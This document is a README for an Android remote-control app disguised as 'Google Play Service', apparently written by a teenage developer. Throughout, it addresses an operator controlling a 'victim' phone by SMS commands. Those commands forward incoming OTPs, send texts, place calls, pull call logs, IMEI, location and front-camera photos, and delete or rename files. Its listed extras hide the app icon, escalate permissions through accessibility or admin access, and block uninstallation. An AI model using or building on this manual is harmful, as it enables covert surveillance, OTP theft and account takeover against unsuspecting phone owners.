# Google Play Service Command Bot

## Table of Contents
- [About The Payload](#about-the-payload)
- [About Developer](#about-developer)
- [Start Usage](#start-usage)
- [Default Features](#default-features)
- [Root is Required](#root-is-required)
- [My Added Features](#my-added-features)
- [For Files Or Folders](#for-files-or-folders)
- [Automatic Features](#automatic-features)
- [Command Bot App Required Permissions](#command-bot-app-required-permissions)
- [Pro Features](#pro-features)

## About The Payload
- **App Name:** Google Play Service
- **Size:** 9.07 MB
- **Package Name:** com.KaranKumar.SmsCommandBot
- **Min SDK:** 16
- **Target SDK:** 31
- **Compatible with Android:** 5-13
- **Version:** 1.0-Release
- **Note:** May not work on Xiaomi devices in the future.

## About Developer
- **Name:** Karan Kumar
- **Age:** 15+
- **Gender:** Male
- **Languages:** English, Hindi
- **Bio:** I am a FullStack Software Developer, currently learning Cyber Security.
- **Programming Languages:** Go, Shell/Bash, Dart, HTML, JS, CSS, Java, Ruby, C++, C#, XML, Swift, Python, Lua, etc.

## Start Usage
Send the first 'Start_Bot@x@1234567890' command to configure your number with the bot. Replace '1234567890' with your mobile number. This function forwards incoming OTPs from the victim's device to your number.

Note: Android allows sending only a maximum of 160 characters in a message. If it's longer, the message can't be sent.

## Default Features
- 'AM Bluetooth Off' to turn off Bluetooth
- 'AM Bluetooth On' to turn on Bluetooth
- 'AM Flash Off' to turn off Flashlight
- 'AM Flash On' to turn on Flashlight
- 'AM Gps' to get the location URL
- 'AM Ip' to get the IP address
- 'AM Normal' to set the device to normal mode
- 'AM Silent' to set the device to silent mode
- 'AM Sms@x@<number>@x@<message>' to send an SMS from the victim's device to a given number. Replace <number> and <message>.
- 'AM Toast@x@<your toast>' to show a toast message on the victim's device. Replace <your toast>.
- 'AM Wallpaper' to change the wallpaper
- 'AM Wifi Off' to turn off Wi-Fi
- 'AM Wifi On' to turn on Wi-Fi
- 'AM Wifiname' to get connected Wi-Fi's name

## Root is Required
- 'AM Boot' to reboot the device
- 'AM Shut' to shut down the device

## My Added Features
- 'eDEVICE_INFO', 'gDEVICE_INFO', 'zDEVICE_INFO', 'xDEVICE_INFO' to get device information
- 'getDeviceId' to get the device ID
- 'getIMEI' to get the device IMEI number
- 'getMac' to get the MAC address
- 'getPublicIpV4' to get the public IPv4 address
- 'getPublicIpV6' to get the public IPv6 address
- 'getBatteryInfo' to get battery information
- 'getCallLog' to get call logs
- 'getCallLogFile' to get call logs in a text.txt file
- 'StartCallPhone@x@<number>' to call anyone with the victim's device. Replace <number>.
- 'checkConnection' to check if mobile data is on
- 'getFrontCamImage' to get the front camera image (may not work on some devices)
- 'getInstalledApp' to get installed app names or package names
- 'Play_Ring' to play the device's ringtone
- 'Play_Sound@1' and 'Play_Sound@2' to play default sounds from the app's raw folder
- 'playSoundUri@x@<path>' to play a sound with a provided path. Replace <path>.
- 'setWallpaperUri@x@<FullURL-https://example.com/image.png&image.jpeg>' to set the wallpaper with a URL. Mobile data is required.

## For Files Or Folders
- 'delete_File@x@<pathWithFileName>' to delete a file on the victim's device. Replace <pathWithFileName>.
- 'rename_File@x@<pathWithFileName>@x@<PathWithNewFileName>' to rename a file on the victim's device. Replace old and new file paths.
- 'cd_List@x@<FolderPathToViewFiles>' to view files or folders on the victim's device. Replace <FolderPathToViewFiles>.
- 'rename_Folder@x@<FolderFullPath>@x@<NewFolderNameWithPath>' to rename a folder on the victim's device. Replace old folder path and new folder name.

## Automatic Features
Automatic features include auto-sending incoming OTPs and incoming call numbers or names to your number in the background.

## Command Bot App Required Permissions
1. READ_SMS
2. SEND_SMS
3. INTERNET
4. BIND_DEVICE_ADMIN
5. ACCESSIBILITY
6. WRITE_FILE
7. READ_FILE
8. READ_CALL_LOG
9. READ_SMS
10. READ_CONTACT
11. ACCESS_LOCATION
12. ACCESS_STORAGE
13. SET_WALLPAPER
14. BROADCAST_BOOT_COMPLETE_RECEIVED
15. Other permissions as needed.

## Pro Features
- Auto acquiring all permissions after admin or accessibility permission is granted.
- Hiding the app icon after admin permission is granted.
- Prompting the user to enter a password to uninstall the app; incorrect passwords prevent uninstallation (uninstall password: 1234).
- Running in the background after the device boots, auto-starting with an alarm receiver to check if the service is running.
